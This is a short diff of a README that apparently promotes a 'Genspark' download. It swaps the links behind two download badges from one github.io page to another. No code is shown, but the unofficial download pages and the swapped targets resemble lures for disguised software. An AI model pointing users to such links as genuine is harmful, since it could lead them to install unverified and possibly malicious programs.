@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://six-sevens.github.io/.github/genspark">
+  <a href="https://stul-stol.github.io/.github/genspark">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Genspark"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The autonomous research agent model — where Genspark actively browses web sour
 
 <p align="center">
 
-[![Get it Now Genspark](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/genspark)
+[![Get it Now Genspark](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://stul-stol.github.io/.github/genspark)
 
 </p>
 
